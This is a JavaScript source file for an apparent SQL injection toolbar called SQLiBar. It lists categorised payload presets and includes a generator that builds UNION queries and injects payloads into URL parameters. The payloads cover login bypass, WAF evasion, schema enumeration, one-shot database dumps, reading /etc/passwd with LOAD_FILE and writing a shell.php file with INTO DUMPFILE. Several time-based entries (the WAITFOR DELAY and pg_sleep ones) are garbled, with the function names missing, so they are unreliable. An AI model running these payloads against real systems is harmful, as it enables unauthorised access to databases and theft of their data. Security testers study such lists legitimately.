/**
 * SQLiBar – Comprehensive Payload Presets
 * Clean, practical, well-categorized
 * Dynamic UNION generation included
 */

const presetCategories = {

    /* ------------------------------------------------------------------ */
    /* 1. Detection / Fingerprinting                                      */
    /* ------------------------------------------------------------------ */
    "Detection": [
        { name: "Single Quote", payload: "'" },
        { name: "Double Quote", payload: "\"" },
        { name: "Backslash", payload: "\\" },
        { name: "Quote + Comment --", payload: "'--" },
        { name: "Quote + Comment #", payload: "'#" },
        { name: "Quote + Comment /*", payload: "'/*" },
        { name: "Null Byte", payload: "%00" },
        { name: "Quote + Null Byte", payload: "'%00" },
        { name: "Parenthesis", payload: "')" },
        { name: "Semicolon", payload: "';" },
        { name: "Special Chars", payload: "test'\"<>;()\\" },
        { name: "Logic Error", payload: "' AND 1=CONVERT(int,@@version)--" },
        { name: "Version Check (MySQL)", payload: "' AND @@version LIKE '5%'--" },
        { name: "Version Check (MSSQL)", payload: "' AND @@version LIKE '%Microsoft%'--" },
        { name: "Version Check (Postgres)", payload: "' AND version() LIKE '%PostgreSQL%'--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 2. Authentication Bypass                                           */
    /* ------------------------------------------------------------------ */
    "Auth Bypass": [
        { name: "OR 1=1 --", payload: "' OR 1=1--" },
        { name: "OR 1=1 #", payload: "' OR 1=1#" },
        { name: "OR '1'='1", payload: "' OR '1'='1" },
        { name: "OR 1=1 LIMIT 1--", payload: "' OR 1=1 LIMIT 1--" },
        { name: "admin'--", payload: "admin'--" },
        { name: "admin' #", payload: "admin'#" },
        { name: "admin'/*", payload: "admin'/*" },
        { name: "' OR 'a'='a", payload: "' OR 'a'='a" },
        { name: "') OR ('1'='1", payload: "') OR ('1'='1" },
        { name: "')) OR (('1'='1", payload: "')) OR (('1'='1" },
        { name: "OR TRUE--", payload: "' OR TRUE--" },
        { name: "OR 1--", payload: "' OR 1--" },
        { name: "OR 1=1)--", payload: "') OR 1=1--" },
        { name: "OR 1=1))--", payload: "')) OR 1=1--" },
        { name: "admin' OR 1=1--", payload: "admin' OR 1=1--" },
        { name: "' OR 1=1 LIMIT 1#", payload: "' OR 1=1 LIMIT 1#" }
    ],

    /* ------------------------------------------------------------------ */
    /* 3. Boolean-based                                                   */
    /* ------------------------------------------------------------------ */
    "Boolean-based": [
        { name: "AND 1=1", payload: "' AND 1=1--" },
        { name: "AND 1=2", payload: "' AND 1=2--" },
        { name: "AND '1'='1", payload: "' AND '1'='1" },
        { name: "AND '1'='2", payload: "' AND '1'='2" },
        { name: "OR 1=1", payload: "' OR 1=1--" },
        { name: "OR 1=2", payload: "' OR 1=2--" },
        { name: "AND TRUE", payload: "' AND TRUE--" },
        { name: "AND FALSE", payload: "' AND FALSE--" },
        { name: "AND (SELECT 1)=1", payload: "' AND (SELECT 1)=1--" },
        { name: "AND (SELECT 1)=2", payload: "' AND (SELECT 1)=2--" },
        { name: "AND SUBSTRING(@@version,1,1)='5'", payload: "' AND SUBSTRING(@@version,1,1)='5'--" },
        { name: "AND ASCII(SUBSTRING(@@version,1,1))>50", payload: "' AND ASCII(SUBSTRING(@@version,1,1))>50--" },
        { name: "AND LENGTH(database())>1", payload: "' AND LENGTH(database())>1--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 4. Union-based (dynamic)                                           */
    /* ------------------------------------------------------------------ */
    "Union-based": [
        { name: "UNION NULL", payload: null, dynamic: "union-null" },
        { name: "UNION ALL NULL", payload: null, dynamic: "union-all-null" },
        { name: "UNION Numbers", payload: null, dynamic: "union-numbers" },
        { name: "UNION + version", payload: null, dynamic: "union-version" },
        { name: "UNION + user()", payload: null, dynamic: "union-user" },
        { name: "UNION + database()", payload: null, dynamic: "union-db" },
        { name: "UNION + @@hostname", payload: null, dynamic: "union-hostname" },
        { name: "ORDER BY (columns)", payload: null, dynamic: "union-orderby" },
        { name: "UNION + table_name", payload: null, dynamic: "union-tables" },
        { name: "UNION + column_name", payload: null, dynamic: "union-columns" }
    ],

    /* ------------------------------------------------------------------ */
    /* 5. Error-based                                                     */
    /* ------------------------------------------------------------------ */
    "Error-based": [
        // MySQL
        { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
        { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
        { name: "FLOOR + RAND", payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
        { name: "EXP overflow", payload: "' AND EXP(~(SELECT * FROM (SELECT @@version)x))--" },
        { name: "GTID_SUBSET", payload: "' AND GTID_SUBSET(CONCAT(0x7e,@@version),1)--" },
        { name: "JSON_KEYS", payload: "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,@@version)) USING utf8)))--" },

        // MSSQL
        { name: "CONVERT (MSSQL)", payload: "' AND 1=CONVERT(int,@@version)--" },
        { name: "CAST (MSSQL)", payload: "' AND 1=CAST(@@version AS int)--" },
        { name: "UPDATEXML (MSSQL)", payload: "' AND 1=(UPDATEXML(1,CONCAT(0x7e,@@version)))--" },

        // PostgreSQL
        { name: "CAST (Postgres)", payload: "' AND 1=CAST(version() AS int)--" },
        { name: "to_char error", payload: "' AND 1=CAST((SELECT version()) AS int)--" },

        // Oracle
        { name: "CTXSYS (Oracle)", payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--" },
        { name: "XMLType (Oracle)", payload: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual) IS NOT NULL--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 6. Time-based / Blind                                              */
    /* ------------------------------------------------------------------ */
    "Time-based": [
        { name: "SLEEP 5 (MySQL)", payload: "' AND SLEEP(5)--" },
        { name: "SLEEP 10", payload: "' AND SLEEP(10)--" },
        { name: "BENCHMARK", payload: "' AND BENCHMARK(5000000,SHA1('test'))--" },
        { name: "heavy query", payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" },
        { name: "IF SLEEP", payload: "' OR IF(1=1,SLEEP(5),0)--" },
        { name: "WAITFOR DELAY 5 (MSSQL)", payload: "';(5)--" },
        { name: "WAITFOR DELAY 10", payload: "';(10)--" },
        { name: "pg_sleep 5 (Postgres)", payload: "';(5)--" },
        { name: "pg_sleep 10", payload: "';(10)--" },
        { name: "DBMS_PIPE (Oracle)", payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--" },
        { name: "CASE WHEN SLEEP", payload: "' AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 7. ORDER BY / GROUP BY Column Count                                         */
    /* ------------------------------------------------------------------ */
    "ORDER BY": [
        { name: "ORDER BY 1", payload: "' ORDER BY 1--" },
        { name: "ORDER BY 5", payload: "' ORDER BY 5--" },
        { name: "ORDER BY 10", payload: "' ORDER BY 10--" },
        { name: "ORDER BY 15", payload: "' ORDER BY 15--" },
        { name: "ORDER BY 20", payload: "' ORDER BY 20--" },
        { name: "ORDER/**/BY", payload: "'/**/ORDER/**/BY/**/1--" },
        { name: "/*!ORDER BY*/", payload: "'/*!ORDER BY*/1--" },
        { name: "/*!50000ORDER BY*/", payload: "'/*!50000ORDER BY*/1--" },
        { name: "ORDER BY (SELECT 1)", payload: "' ORDER BY (SELECT 1)--" }
    ],
    "GROUP BY": [
        { name: "GROUP BY 1", payload: "' GROUP BY 1--" },
        { name: "GROUP BY 1,2", payload: "' GROUP BY 1,2--" },
        { name: "GROUP BY 1,2,3", payload: "' GROUP BY 1,2,3--" },
        { name: "GROUP BY NULL", payload: "' GROUP BY NULL--" },
        { name: "GROUP/**/BY", payload: "'/**/GROUP/**/BY/**/1--" },
        { name: "/*!GROUP BY*/", payload: "'/*!GROUP BY*/1--" },
        { name: "/*!50000GROUP BY*/", payload: "'/*!50000GROUP BY*/1--" },
        { name: "GROUP BY (SELECT 1)", payload: "' GROUP BY (SELECT 1)--" },
        { name: "GROUP BY 1 HAVING 1=1", payload: "' GROUP BY 1 HAVING 1=1--" },
        { name: "GROUP BY 1 HAVING 1=2", payload: "' GROUP BY 1 HAVING 1=2--" }
    ],
    /* ------------------------------------------------------------------ */
    /* 8. Information Schema / Enumeration                                */
    /* ------------------------------------------------------------------ */
    "Enumeration": [
        { name: "database()", payload: "' UNION SELECT database(),NULL--" },
        { name: "user()", payload: "' UNION SELECT user(),NULL--" },
        { name: "@@version", payload: "' UNION SELECT @@version,NULL--" },
        { name: "@@hostname", payload: "' UNION SELECT @@hostname,NULL--" },
        { name: "schema()", payload: "' UNION SELECT schema(),NULL--" },
        { name: "current_user", payload: "' UNION SELECT current_user,NULL--" },
        { name: "Tables (basic)", payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--" },
        { name: "Tables + schema", payload: "' UNION SELECT table_schema,table_name FROM information_schema.tables--" },
        { name: "Columns", payload: "' UNION SELECT column_name,NULL FROM information_schema.columns--" },
        { name: "Columns of table", payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" },
        { name: "group_concat tables", payload: "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--" },
        { name: "group_concat columns", payload: "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 9. WAF / Filter Bypass                                             */
    /* ------------------------------------------------------------------ */
    "WAF Bypass": [
        // Comment & whitespace tricks
        { name: "/**/ instead of space", payload: "'/**/OR/**/1=1--" },
        { name: "Inline comment", payload: "'/**/OR/**/1/**/=/**/1--" },
        { name: "%0a / %0d", payload: "'%0aOR%0a1=1--" },
        { name: "%09 Tab", payload: "'%09OR%091=1--" },
        { name: "%0b / %0c", payload: "'%0bOR%0c1=1--" },
        { name: "/*! */ MySQL", payload: "'/*!OR*/1=1--" },
        { name: "/*!50000*/", payload: "'/*!50000OR*/1=1--" },

        // Case & encoding
        { name: "UnIoN SeLeCt", payload: "' UnIoN SeLeCt NULL--" },
        { name: "%55nion %53elect", payload: "'%55nion %53elect NULL--" },
        { name: "Double URL Encode", payload: "%2527%20OR%201%253D1--" },
        { name: "Unicode %u0027", payload: "%u0027 OR 1=1--" },
        { name: "Hex 0x27", payload: "0x27 OR 1=1--" },

        // Logical alternatives
        { name: "|| instead of OR", payload: "' || 1=1--" },
        { name: "&& instead of AND", payload: "' && 1=1--" },
        { name: "LIKE instead of =", payload: "' OR '1' LIKE '1" },
        { name: "REGEXP", payload: "' OR '1' REGEXP '1" },
        { name: "BETWEEN", payload: "' OR 1 BETWEEN 0 AND 1--" },
        { name: "IS NOT NULL", payload: "' OR 1 IS NOT NULL--" },
        { name: "Null-safe <=>", payload: "' OR 1<=>1--" },
        { name: "Scientific 1e0", payload: "' OR 1e0=1e0--" },

        // Advanced UNION bypasses
        { name: "/*!50000UNION SELECT*/", payload: "'/**//*!50000UNION SELECT*//**/1,2,3--" },
        { name: "union distinct select", payload: "'+union+distinct+select+1,2,3--" },
        { name: "un/**/ion se/**/lect", payload: "'+un/**/ion+se/**/lect+1,2,3--" },
        { name: "%0Aunion%0Aselect", payload: "'%0Aunion%0Aselect%0A1,2,3--" },
        { name: "/*!uNIOn*/ /*!SelECt*/", payload: "'/*!uNIOn*/ /*!SelECt*/1,2,3--" },
        { name: "UNION(SELECT(1),2,3)", payload: "'UNION(SELECT(1),2,3)--" },
        { name: "/*!--*/union/*!--*/", payload: "'/*!--*/union/*!--*/select/*!--*/1,2,3--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 10. Stacked Queries & Dangerous                                    */
    /* ------------------------------------------------------------------ */
    "Stacked / File": [
        { name: "Stacked WAITFOR", payload: "';(5)--" },
        { name: "Stacked SELECT", payload: "';(1)--" },
        { name: "INTO OUTFILE", payload: "' INTO OUTFILE '/tmp/out.txt'--" },
        { name: "INTO DUMPFILE", payload: "' INTO DUMPFILE '/tmp/shell.php'--" },
        { name: "LOAD_FILE", payload: "' AND LOAD_FILE('/etc/passwd')--" },
        { name: "LOAD_FILE win", payload: "' AND LOAD_FILE('C:\\\\Windows\\\\win.ini')--" }
    ],

    /* ------------------------------------------------------------------ */
    /* 11. Useful Functions / Helpers                                     */
    /* ------------------------------------------------------------------ */
    "Helpers": [
        { name: "CONCAT()", payload: "CONCAT()" },
        { name: "CONCAT_WS()", payload: "CONCAT_WS(':',user(),database())" },
        { name: "GROUP_CONCAT()", payload: "GROUP_CONCAT(table_name)" },
        { name: "GROUP_CONCAT separator", payload: "GROUP_CONCAT(table_name SEPARATOR ',')" },
        { name: "SUBSTRING", payload: "SUBSTRING(@@version,1,1)" },
        { name: "MID / SUBSTR", payload: "MID(@@version,1,1)" },
        { name: "ASCII / ORD", payload: "ASCII(SUBSTRING(@@version,1,1))" },
        { name: "LENGTH / CHAR_LENGTH", payload: "LENGTH(database())" },
        { name: "HEX / UNHEX", payload: "HEX(database())" },
        { name: "CHAR()", payload: "CHAR(49,50,51)" },
        { name: "IF / CASE", payload: "IF(1=1,SLEEP(5),0)" },
        { name: "version()", payload: "version()" },
        { name: "user() / current_user()", payload: "user()" },
        { name: "database() / schema()", payload: "database()" }
    ],
    
    "Alternatives / Math": [
        { name: "MOD(1,1)", payload: "' OR MOD(1,1)--" },
        { name: "MOD(1,2)", payload: "' OR MOD(1,2)--" },
        { name: "1 DIV 1", payload: "' OR 1 DIV 1--" },
        { name: "1 XOR 0", payload: "' OR 1 XOR 0--" },
        { name: "1&1", payload: "' OR 1&1--" },
        { name: "1|0", payload: "' OR 1|0--" },
        { name: "1^0", payload: "' OR 1^0--" },
        { name: "1*1", payload: "' OR 1*1--" },
        { name: "1+0", payload: "' OR 1+0--" },
        { name: "POWER(1,1)", payload: "' OR POWER(1,1)--" },
        { name: "IN (1)", payload: "' OR 1 IN (1)--" },
        { name: "NOT IN (0)", payload: "' OR 1 NOT IN (0)--" },
        { name: "BETWEEN 0 AND 1", payload: "' OR 1 BETWEEN 0 AND 1--" },
        { name: "NOT BETWEEN 2 AND 3", payload: "' OR 1 NOT BETWEEN 2 AND 3--" },
        { name: "EXISTS(SELECT 1)", payload: "' OR EXISTS(SELECT 1)--" },
        { name: "SOUNDS LIKE", payload: "' OR 'a' SOUNDS LIKE 'a'--" },
        { name: "RLIKE", payload: "' OR '1' RLIKE '1'--" },
        { name: "IFNULL(1,0)=1", payload: "' OR IFNULL(1,0)=1--" },
        { name: "COALESCE(1,0)=1", payload: "' OR COALESCE(1,0)=1--" }
    ],

    "DumpInOneShot": [
        { name: "DIOS_1", payload: "concat_ws('<br>','zet',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))" },
        { name: "DIOS_Databases", payload: "(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.schemata)%20where%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,schema_name))))x)" },
        { name: "DIOS_Tables", payload: "(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.tables)%20where%20(table_schema=database())%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,table_name))))x)" },
        { name: "DIOS_4", payload: "concat(@c:=0x00,if((select%20count(*)%20from%20information_schema.columns%20where%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c)" },
        { name: "DIOS_5", payload: "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))" },
        { name: "DIOS_6", payload: "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)" },
        { name: "DIOS_7", payload: "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))" }
    ]
};


/**
 * Dynamic UNION / ORDER BY payload generator
 */
function buildUnionPayload(type, columns) {
    const cols = Math.max(1, Math.min(50, parseInt(columns, 10) || 5));
    const nulls = Array(cols).fill("NULL").join(",");
    const numbers = Array.from({ length: cols }, (_, i) => i + 1).join(",");
    const nullsRest = cols > 1 ? "," + Array(cols - 1).fill("NULL").join(",") : "";

    switch (type) {
        case "union-null":
            return `' UNION SELECT ${nulls}--`;
        case "union-all-null":
            return `' UNION ALL SELECT ${nulls}--`;
        case "union-numbers":
            return `' UNION SELECT ${numbers}--`;
        case "union-version":
            return `' UNION SELECT @@version${nullsRest}--`;
        case "union-user":
            return `' UNION SELECT user()${nullsRest}--`;
        case "union-db":
            return `' UNION SELECT database()${nullsRest}--`;
        case "union-hostname":
            return `' UNION SELECT @@hostname${nullsRest}--`;
        case "union-orderby":
            return `' ORDER BY ${cols}--`;
        case "union-tables":
            return `' UNION SELECT table_name${nullsRest} FROM information_schema.tables--`;
        case "union-columns":
            return `' UNION SELECT column_name${nullsRest} FROM information_schema.columns--`;
        default:
            return `' UNION SELECT ${numbers}--`;
    }
}


/**
 * Legacy function – no longer used (cursor injection is preferred)
 * Kept only for reference / possible future "Inject into all params" feature
 */
function createTestUrl(url, payload) {
    try {
        const target = new URL(url);
        const keys = Array.from(target.searchParams.keys());

        if (keys.length === 0) {
            target.searchParams.set("id", payload);
            return target.toString();
        }

        keys.forEach(key => {
            const current = target.searchParams.get(key) || "";
            target.searchParams.set(key, current + payload);
        });

        return target.toString();
    } catch (e) {
        return url + (url.includes("?") ? "&" : "?") + "payload=" + encodeURIComponent(payload);
    }
}